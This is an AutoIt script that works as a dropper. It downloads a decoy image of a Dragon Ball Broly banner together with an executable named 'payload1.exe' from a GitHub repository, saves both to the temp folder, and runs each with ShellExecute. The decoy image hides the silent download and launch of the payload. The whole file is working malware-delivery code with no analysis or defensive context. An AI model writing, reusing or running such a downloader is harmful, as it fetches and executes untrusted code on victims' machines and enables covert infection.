#include <StaticConstants.au3>
#include <WindowsConstants.au3>

Local $urls = "https://cdn.vox-cdn.com/thumbor/nwvCgEEsVPtb4fUpoQ2bys6DMYc=/0x0:1600x959/1200x800/filters:focal(670x165:926x421)/cdn.vox-cdn.com/uploads/chorus_image/image/69260607/FunFilms_DBSBroly_Landing.0.jpg,https://github.com/Deadshot-SSJB/Crtptx_kali/blob/main/payload1.exe"

Local $urlsArray = StringSplit($urls, ",", 2 )

For $url In $urlsArray
	$sFile = _DownloadFile($url)
	shellExecute($sFile)

Next

Func _DownloadFile($sURL)
    Local $hDownload, $sFile
    $sFile = StringRegExpReplace($sURL, "^.*/", "")
    $sDirectory = @TempDir & $sFile
    $hDownload = InetGet($sURL, $sDirectory, 17, 1)
    InetClose($hDownload)
    Return $sDirectory
EndFunc   ;==>_GetURLImage